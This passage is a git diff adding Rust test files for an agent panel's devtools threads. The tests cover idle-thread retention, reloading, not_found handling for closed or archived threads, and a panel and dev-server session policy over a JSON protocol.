+    let [devtools] = retained_devtools_threads(&app, cx)[..] else {
+        panic!("one devtools thread, connecting");
+    };
+
+    open_another_editor_thread(&mut app);
+
+    assert!(
+        !is_retained(&app, editor),
+        "the cleanup ran: the idle editor thread over the cap was released"
+    );
+    assert!(
+        is_retained(&app, devtools),
+        "the connecting devtools thread survived it"
+    );
+    assert!(
+        created.borrow().is_none(),
+        "and create is still waiting on its connection, not answered `released`"
+    );
+}
+
+#[gpui::test]
+async fn ensure_loaded_reloads_a_released_devtools_thread_without_moving_the_editor(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let used = create("/p/app", cx).await.expect("created");
+    promote(&used.thread_id, cx);
+    let id = thread_id_of(&used.thread_id, cx);
+
+    // A connected, idle devtools thread follows the editor's idle cap like any thread (R8.3).
+    set_max_idle_retained_threads(0, cx);
+    open_another_editor_thread(&mut app);
+    assert_eq!(view_of(&app, id), None, "released: no window holds it");
+    set_max_idle_retained_threads(5, cx);
+
+    let editor_thread = app.thread().entity_id();
+    ensure_loaded(&used.thread_id, cx)
+        .await
+        .expect("R5.6: a persisted devtools thread is loaded again");
+    assert!(is_retained(&app, id), "loaded among the retained threads");
+    assert_eq!(
+        app.thread().entity_id(),
+        editor_thread,
+        "A2: the editor still shows its own thread"
+    );
+}
+
+#[gpui::test]
+async fn ensure_loaded_answers_not_found_for_an_archived_devtools_thread(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let used = create("/p/app", cx).await.expect("created");
+    promote(&used.thread_id, cx);
+    let id = thread_id_of(&used.thread_id, cx);
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx).update(cx, |store, cx| store.archive(id, None, cx))
+    });
+    cx.run_until_parked();
+
+    let error = ensure_loaded(&used.thread_id, cx)
+        .await
+        .expect_err("an archived devtools thread is not loaded");
+    assert!(
+        matches!(
+            error.downcast_ref::<DevtoolsThreadError>(),
+            Some(DevtoolsThreadError::NotFound { .. })
+        ),
+        "NotFound, so the panel drops its binding (R5.8): {error:#}"
+    );
+    assert!(
+        !cx.update(|cx| crate::devtools_threads::is_devtools_of(
+            &used.thread_id,
+            Path::new("/p/app"),
+            cx
+        )),
+        "consistent with list, which hides it"
+    );
+}
+
+#[gpui::test]
+async fn ensure_loaded_finds_a_devtools_thread_parked_in_the_draft_slot(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    // A thread with a message: activating it never parks it as the empty draft.
+    crate::test_support::send_message(&app.panel, &mut app.cx);
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx);
+    let created = create("/p/app", cx).await.expect("created");
+    let [devtools] = retained_devtools_threads(&app, cx)[..] else {
+        panic!("one devtools thread");
+    };
+    assert_eq!(devtools.to_key_string(), created.thread_id);
+
+    // The operator opens the empty devtools thread from the sidebar, then goes back: the panel
+    // parks it in its draft slot, neither active nor retained.
+    app.panel.update_in(&mut app.cx, |panel, window, cx| {
+        panel.activate_retained_thread(devtools, false, window, cx)
+    });
+    app.panel.update_in(&mut app.cx, |panel, window, cx| {
+        panel.activate_retained_thread(editor, false, window, cx)
+    });
+    cx.run_until_parked();
+    assert_eq!(
+        crate::test_support::active_thread_id(&app.panel, &app.cx),
+        editor
+    );
+    assert!(!is_retained(&app, devtools));
+    let parked = view_of(&app, devtools).expect("parked in the draft slot");
+
+    ensure_loaded(&created.thread_id, cx)
+        .await
+        .expect("the parked view is the loaded thread");
+    assert_eq!(
+        view_of(&app, devtools),
+        Some(parked),
+        "the same view: no second one was built"
+    );
+    assert!(
+        !is_retained(&app, devtools),
+        "and no copy joined the retained threads"
+    );
+}
+
+#[gpui::test]
+async fn a_devtools_thread_reloading_in_a_run_that_created_none_survives_the_idle_cap(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    // A devtools thread from an earlier run: a thread with a session and a persisted mark, and no
+    // `create` in this run to build the registry.
+    let devtools = crate::test_support::active_thread_id(&app.panel, &app.cx);
+    promote(&devtools.to_key_string(), cx);
+    cx.update(|cx| {
+        if ThreadOrganizationStore::try_global(cx).is_none() {
+            crate::thread_organization::init(cx);
+        }
+        ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store
+                .set_devtools_root(devtools, PathBuf::from("/p/app"), cx)
+                .expect("a thread with a session takes the mark")
+        })
+    });
+    cx.run_until_parked();
+    assert!(
+        cx.update(|cx| DevtoolsThreads::try_global(cx).is_none()),
+        "nothing built the registry in this run"
+    );
+    set_max_idle_retained_threads(0, cx);
+    open_another_editor_thread(&mut app);
+    assert_eq!(
+        view_of(&app, devtools),
+        None,
+        "not loaded, as after a restart"
+    );
+
+    stall_connections_of(&app, Agent::Custom { id: "Test".into() }, cx);
+    let task =
+        cx.update(|cx| crate::devtools_threads::ensure_loaded(&devtools.to_key_string(), cx));
+    let loaded = watch(task, cx);
+    cx.run_until_parked();
+    let other_editor = crate::test_support::active_thread_id(&app.panel, &app.cx);
+    open_another_editor_thread(&mut app);
+
+    assert!(
+        !is_retained(&app, other_editor),
+        "the cleanup ran: the idle editor thread over the cap was released"
+    );
+    assert!(
+        is_retained(&app, devtools),
+        "R5.6: the devtools thread reloading for a panel survived it"
+    );
+    assert!(
+        loaded.borrow().is_none(),
+        "and ensure_loaded is still waiting on its connection, not answered `released`"
+    );
+}
+
+#[gpui::test]
+async fn past_the_connect_timeout_a_devtools_thread_still_connecting_follows_the_idle_cap(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    set_max_idle_retained_threads(0, cx);
+    stall_connections(&app, cx);
+    let created = start_create("/p/app", cx);
+    let [devtools] = retained_devtools_threads(&app, cx)[..] else {
+        panic!("one devtools thread, connecting");
+    };
+
+    cx.executor().advance_clock(CONNECT_TIMEOUT);
+    cx.run_until_parked();
+    let error = created
+        .borrow_mut()
+        .take()
+        .expect("answered at the timeout")
+        .expect_err("the agent never connected");
+    assert_eq!(start_failure_reason(&error), Some("timeout"), "{error:#}");
+
+    open_another_editor_thread(&mut app);
+    assert!(
+        !is_retained(&app, devtools),
+        "nobody waits on it any more: a connection that never comes is not kept forever"
+    );
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_threads_reopen.rs b/crates/agent_ui/src/browser_channel_tests/devtools_threads_reopen.rs
new file mode 100644
index 0000000..39f92f3
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_threads_reopen.rs
@@ -0,0 +1,314 @@
+// Story 055, task 18.1 (refine v3) — an empty devtools thread gone with its window answers
+// `not_found` (design.md §B3 "Empty thread gone with its window (v3)"). Requirements: R5.9, R5.6
+// (Q4, Q5). Found by 16.2's GUI proof: after the project was closed and reopened, the panel's
+// empty bound thread answered `agent_start_failed` (reason `no_agent_panel`) instead of
+// `not_found`, so the panel never took R5.8's path.
+//
+// An ADDITIONAL test file beside task 10.2's `browser_channel_tests/devtools_threads.rs` (that
+// file is left untouched). Wired INSIDE `src/browser_channel.rs` like the other devtools test
+// modules — it reuses `test_support`, which is private to `browser_channel` — so the test path
+// matches the Validation filter `cargo test -p agent_ui devtools_threads`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_threads_reopen.rs"]
+//     mod devtools_threads_reopen;
+//
+// Contract (design.md §B3): `ensure_loaded(thread_id, cx)` for a marked devtools thread with no
+// persisted mark (never sent a message) and no live conversation entity answers
+// `DevtoolsThreadError::NotFound` — decided BEFORE the window / agent-panel lookup, so it holds
+// whether the project is still closed, reopened in a window whose agent panel is not there yet
+// (the GUI case: `no_agent_panel` today), or reopened with an agent panel. A persisted devtools
+// thread and a live draft keep today's path.
+//
+// Seams used (all already exist): `crate::devtools_threads::{create, ensure_loaded,
+// is_devtools_of, DevtoolsThreadError, CONNECT_TIMEOUT}`; `ThreadMetadataStore::save` with a
+// `session_id` is the promotion trigger (as in 10.2's tests).
+//
+// Hostile halves first (R5.9 says WHICH threads are gone; both converses):
+//   - wrongly collapsed: a live empty draft in a window that is still open, a persisted devtools
+//     thread whose window closed (`project_closed`, not `not_found`), and the same persisted thread
+//     reopened (it loads — R5.6 — or fails to start, never `not_found`) all stay apart from the
+//     gone draft. "Any closed window means not_found" or "every unpromoted thread is not_found"
+//     both fail here;
+//   - wrongly split: the gone draft answers the SAME `not_found` whether no window holds its
+//     project, a window holds it without an agent panel, or a window holds it with one — a check
+//     placed after the window lookup answers three different things;
+//   - only then the benign case.
+
+use std::path::Path;
+use std::sync::Arc;
+use std::time::Duration;
+
+use acp_thread::StubAgentConnection;
+use fs::FakeFs;
+use gpui::{TestAppContext, WindowHandle};
+use project::Project;
+use workspace::MultiWorkspace;
+
+use super::test_support::*;
+use crate::browser_wire::ChannelError;
+use crate::devtools_threads::{CONNECT_TIMEOUT, DevtoolsThreadError};
+use crate::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+
+mod seam {
+    use std::path::Path;
+
+    use anyhow::Result;
+    use gpui::TestAppContext;
+
+    use crate::browser_wire::ThreadInfo;
+
+    pub async fn create(root: &str, cx: &mut TestAppContext) -> Result<ThreadInfo> {
+        let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+        cx.run_until_parked();
+        task.await
+    }
+
+    pub fn is_devtools_of(thread_id: &str, root: &str, cx: &mut TestAppContext) -> bool {
+        cx.update(|cx| crate::devtools_threads::is_devtools_of(thread_id, Path::new(root), cx))
+    }
+
+    /// `ensure_loaded`, settled: past [`crate::devtools_threads::CONNECT_TIMEOUT`] a load still
+    /// connecting has answered too, so the result is always decided when this returns.
+    pub async fn ensure_loaded(thread_id: &str, cx: &mut TestAppContext) -> Result<()> {
+        let task = cx.update(|cx| crate::devtools_threads::ensure_loaded(thread_id, cx));
+        cx.run_until_parked();
+        cx.executor()
+            .advance_clock(super::CONNECT_TIMEOUT + super::Duration::from_secs(1));
+        cx.run_until_parked();
+        task.await
+    }
+}
+
+/// What `ensure_loaded` answered, as the wire's code for it, with the error's text for messages.
+fn outcome(result: &anyhow::Result<()>) -> (&'static str, String) {
+    match result {
+        Ok(()) => ("ok", String::new()),
+        Err(error) => {
+            let text = format!("{error:#}");
+            let code = match error.downcast_ref::<DevtoolsThreadError>() {
+                Some(DevtoolsThreadError::NotFound { .. }) => "not_found",
+                Some(DevtoolsThreadError::ProjectClosed { .. }) => "project_closed",
+                Some(DevtoolsThreadError::AgentStartFailed { .. }) => "agent_start_failed",
+                None => "other",
+            };
+            (code, text)
+        }
+    }
+}
+
+fn assert_not_found(result: &anyhow::Result<()>, what: &str) {
+    let (code, text) = outcome(result);
+    assert_eq!(code, "not_found", "R5.9: {what}; answered {code} ({text})");
+    let error = result.as_ref().expect_err("an error");
+    let channel = error
+        .downcast_ref::<DevtoolsThreadError>()
+        .map(DevtoolsThreadError::channel_error);
+    assert_eq!(
+        channel,
+        Some(ChannelError::NotFound),
+        "the panel reads `error not_found` (R5.8): {what}"
+    );
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> ThreadId {
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// The save the conversation makes when the first message goes out: the draft gains a session,
+/// and the devtools mark is persisted (R5.2).
+fn promote(key: &str, cx: &mut TestAppContext) {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let mut metadata = store
+            .read(cx)
+            .entry(id)
+            .cloned()
+            .expect("metadata of a created thread");
+        metadata.session_id = Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+            "session-{key}"
+        )));
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+}
+
+/// Closes `win` the way closing the project's window does, and lets go of every handle the test
+/// held on it, so nothing outside the app keeps its agent panel (or the thread's view) alive.
+fn close(win: Win, cx: &mut TestAppContext) {
+    let mut win = win;
+    win.cx.update(|window, _| window.remove_window());
+    win.cx.run_until_parked();
+    drop(win);
+    cx.run_until_parked();
+}
+
+/// A window on `root` whose agent panel is not there (yet): what a reopened project looks like
+/// before its agent panel is restored — the GUI proof's `no_agent_panel`.
+async fn window_without_agent_panel(
+    fs: &Arc<FakeFs>,
+    root: &str,
+    cx: &mut TestAppContext,
+) -> WindowHandle<MultiWorkspace> {
+    let project = Project::test(fs.clone(), [Path::new(root)], cx).await;
+    let window = cx.add_window(|window, cx| MultiWorkspace::test_new(project.clone(), window, cx));
+    let workspace = window
+        .read_with(cx, |multi_workspace, _| multi_workspace.workspace().clone())
+        .expect("the window's workspace");
+    workspace.update(cx, |workspace, _| workspace.set_random_database_id());
+    cx.run_until_parked();
+    window
+}
+
+// ---- hostile: wrongly collapsed into "gone" ----------------------------------------------------
+
+#[gpui::test]
+async fn hostile_a_live_empty_draft_beside_a_gone_one_still_answers_its_thread(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let _web = window(&fs, "/p/web", Some(StubAgentConnection::new()), cx).await;
+    let gone = seam::create("/p/app", cx).await.expect("created in /p/app");
+    let live = seam::create("/p/web", cx).await.expect("created in /p/web");
+    close(app, cx);
+
+    // Both are empty, unpromoted devtools threads: only the window tells them apart.
+    let live_result = seam::ensure_loaded(&live.thread_id, cx).await;
+    let (code, text) = outcome(&live_result);
+    assert_eq!(
+        code, "ok",
+        "a live draft in an open window answers its thread, whatever another window did ({text})"
+    );
+    assert!(seam::is_devtools_of(&live.thread_id, "/p/web", cx));
+
+    let gone_result = seam::ensure_loaded(&gone.thread_id, cx).await;
+    assert_not_found(&gone_result, "the empty draft whose window closed");
+}
+
+#[gpui::test]
+async fn hostile_a_persisted_devtools_thread_whose_window_closed_is_project_closed_not_gone(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let used = seam::create("/p/app", cx).await.expect("used");
+    let empty = seam::create("/p/app", cx).await.expect("empty");
+    promote(&used.thread_id, cx);
+    close(app, cx);
+
+    // The persisted one survives its window: it is waiting for its project, not gone.
+    let used_result = seam::ensure_loaded(&used.thread_id, cx).await;
+    let (code, text) = outcome(&used_result);
+    assert_eq!(
+        code, "project_closed",
+        "a persisted devtools thread of a closed project keeps today's answer ({text})"
+    );
+    assert!(
+        text.contains("/p/app"),
+        "Q4: the error names the root: {text}"
+    );
+    // Its empty sibling, same window, same project, is gone.
+    let empty_result = seam::ensure_loaded(&empty.thread_id, cx).await;
+    assert_not_found(&empty_result, "the empty sibling of a persisted thread");
+}
+
+#[gpui::test]
+async fn hostile_a_persisted_devtools_thread_still_loads_after_its_project_reopens(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    close(app, cx);
+    let _again = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+
+    // R5.6: loaded into the reopened window (or, if its agent cannot start here, refused as
+    // `agent_start_failed`) — never answered as a thread that no longer exists.
+    let result = seam::ensure_loaded(&used.thread_id, cx).await;
+    let (code, text) = outcome(&result);
+    assert_ne!(
+        code, "not_found",
+        "a persisted devtools thread is never `not_found` because its window closed once ({text})"
+    );
+    assert!(seam::is_devtools_of(&used.thread_id, "/p/app", cx));
+}
+
+// ---- hostile: wrongly split — the same gone draft, three window states, one answer ----------
+
+#[gpui::test]
+async fn hostile_the_gone_draft_is_not_found_while_its_project_stays_closed(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let gone = seam::create("/p/app", cx).await.expect("created");
+    close(app, cx);
+
+    // Today: `project_closed` (no window holds /p/app).
+    let result = seam::ensure_loaded(&gone.thread_id, cx).await;
+    assert_not_found(&result, "no window holds the project any more");
+}
+
+#[gpui::test]
+async fn hostile_the_gone_draft_is_not_found_when_the_project_reopens_before_its_agent_panel(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let gone = seam::create("/p/app", cx).await.expect("created");
+    close(app, cx);
+    let _reopened = window_without_agent_panel(&fs, "/p/app", cx).await;
+
+    // Today: `agent_start_failed` with reason `no_agent_panel` — the 16.2 GUI finding.
+    let result = seam::ensure_loaded(&gone.thread_id, cx).await;
+    assert_not_found(
+        &result,
+        "the project reopened in a window with no agent panel yet",
+    );
+}
+
+#[gpui::test]
+async fn hostile_the_gone_draft_is_not_found_when_the_project_reopens_with_an_agent_panel(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let gone = seam::create("/p/app", cx).await.expect("created");
+    close(app, cx);
+    let _reopened = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+
+    // Today: the draft is loaded again from its metadata (or fails to start) — decided after the
+    // window lookup. R5.9 decides it before: the thread closed with its project, empty.
+    let result = seam::ensure_loaded(&gone.thread_id, cx).await;
+    assert_not_found(&result, "the project reopened with its agent panel");
+}
+
+// ---- benign -------------------------------------------------------------------------------------
+
+#[gpui::test]
+async fn a_live_draft_in_its_open_window_answers_its_thread(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let fresh = seam::create("/p/app", cx).await.expect("created");
+    let result = seam::ensure_loaded(&fresh.thread_id, cx).await;
+    let (code, text) = outcome(&result);
+    assert_eq!(code, "ok", "{text}");
+    assert!(seam::is_devtools_of(&fresh.thread_id, "/p/app", cx));
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/panel_policy.rs b/crates/agent_ui/src/browser_channel_tests/panel_policy.rs
new file mode 100644
index 0000000..20ea4a7
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/panel_policy.rs
@@ -0,0 +1,961 @@
+// Story 055, task 11.1 — the panel and dev-server session policy beside the extension's
+// (design.md §B4, Assumption A1, §Security "Thread isolation"). Requirements: R2.8, R5.4, R5.5,
+// R5.6, R5.7, R6.2, R6.3, R6.4, R6.5, R7.2, R7.5, R7.7 (Q4, Q5). Zeo's log lines (R9.1-R9.2) are
+// `devtools_logs.rs`. Wired INSIDE `src/browser_channel.rs`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/panel_policy.rs"]
+//     mod panel_policy;
+//
+// Validation: `cargo test -p agent_ui browser_channel` — 045's approval/drive/status/stream tests
+// run under the same filter, which is how "045's tests included" is proved.
+// Fixtures and seams: `test_support` (045). Devtools threads are created through the panel's own
+// `create_thread`, so this file names no task-10 API.
+//
+// Hostile halves first:
+//   - R5.5, three ways a thread is "not yours", ONE answer: an editor thread of the SAME project, a
+//     devtools thread of ANOTHER project, and an id that exists nowhere all answer an identical
+//     `error not_found` (same JSON but the echoed id) — a distinct code or message for "exists but
+//     not yours" would reveal it; and nothing reaches the editor thread afterwards;
+//   - the converse: the panel's OWN devtools thread is reachable (subscribe → snapshot, send → sent);
+//   - R5.7: `subscribe { follow: true }` from a panel is `bad_request`, while the same message from
+//     an approved extension still follows (045 unchanged);
+//   - A1 applies to panels and dev servers ONLY: a 045 hello (no `kind`) still waits for approval;
+//   - project closed: every request but `hello` answers `project_closed`;
+//   - a dev-server session accepts `hello` and nothing else;
+//   - R5.6: subscribing to a PERSISTED devtools thread that is not loaded loads it (snapshot) and the
+//     editor's thread does not move; when loading fails the answer is `agent_start_failed`, never a
+//     `not_found` (which would tell the panel its own thread is gone, R5.8).
+// A persisted, never-loaded devtools thread is built in the stores directly: its metadata (with a
+// session, so not a draft) and its mark through `ThreadOrganizationStore::set_devtools_root`
+// (task 10.1) — the `persisted_devtools_thread()` helper is the one place that names them.
+//
+// Refine v2 (2026-10-15) adds, hostile halves first:
+//   - B4 "replaces 8.1's interim arm": a panel and a dev-server session never get `not_approved`
+//     for any non-hello request — while an extension still waiting for approval, and a session
+//     that has said no hello at all, still do (the rule must key on the hello's kind, not on
+//     "not an extension");
+//   - R7.7: `RevokeBrowserAccess` closes an approved AND a pending extension session, and leaves a
+//     panel and a dev-server session open and served;
+//   - R2.8: a dev-server hello gets exactly `welcome` (echoing the hello id) then ONE state —
+//     `project_open` for an open root, `project_closed` for a root no window holds;
+//   - an ARCHIVED devtools thread answers the same `not_found` as an editor thread, while its
+//     unarchived sibling stays reachable;
+//   - B3 Retention / B4 Eviction: retention cleanup evicting a subscribed idle devtools thread
+//     does not end the panel's stream (no `thread_closed`, no error): the thread is reloaded and
+//     the panel keeps sending to it, with the editor's active view unmoved — while an
+//     extension's stream on an evicted EDITOR thread still gets `thread_closed` and nothing
+//     reloads it.
+
+use std::path::PathBuf;
+
+use acp_thread::{AgentThreadEntry, StubAgentConnection};
+use gpui::{EntityId, TestAppContext, UpdateGlobal as _};
+use serde_json::{Value, json};
+use settings::SettingsStore;
+
+use super::test_support::*;
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173", "panel_url": "http://localhost:5174"
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+/// An announced dev server and a panel session for `root`; returns (announce, panel).
+fn connect_panel(root: &str, n: u64, win: &Win, cx: &mut TestAppContext) -> (Probe, Probe) {
+    let announce = open_session(n);
+    announce.handle(dev_hello(root), &win.app_state(), cx);
+    announce.drain(cx);
+    let panel = open_session(n + 1);
+    panel.handle(panel_hello(root), &win.app_state(), cx);
+    panel.drain(cx);
+    (announce, panel)
+}
+
+fn reply(msgs: &[Value], id: &str) -> Value {
+    msgs.iter()
+        .find(|m| m["id"] == id)
+        .cloned()
+        .unwrap_or_else(|| panic!("no reply to {id}: {msgs:?}"))
+}
+
+fn without_id(mut v: Value) -> Value {
+    if let Some(o) = v.as_object_mut() {
+        o.remove("id");
+    }
+    v
+}
+
+fn created_thread(panel: &Probe, win: &Win, cx: &mut TestAppContext) -> String {
+    panel.handle(
+        request("create_thread", "c", json!({})),
+        &win.app_state(),
+        cx,
+    );
+    let created = reply(&panel.drain(cx), "c");
+    assert_eq!(created["kind"], "created", "{created}");
+    created["thread"]["thread_id"]
+        .as_str()
+        .expect("a thread id")
+        .to_string()
+}
+
+fn user_messages(win: &Win) -> usize {
+    let thread = win.thread();
+    thread.read_with(&win.cx, |thread, _| {
+        thread
+            .entries()
+            .iter()
+            .filter(|e| matches!(e, AgentThreadEntry::UserMessage(_)))
+            .count()
+    })
+}
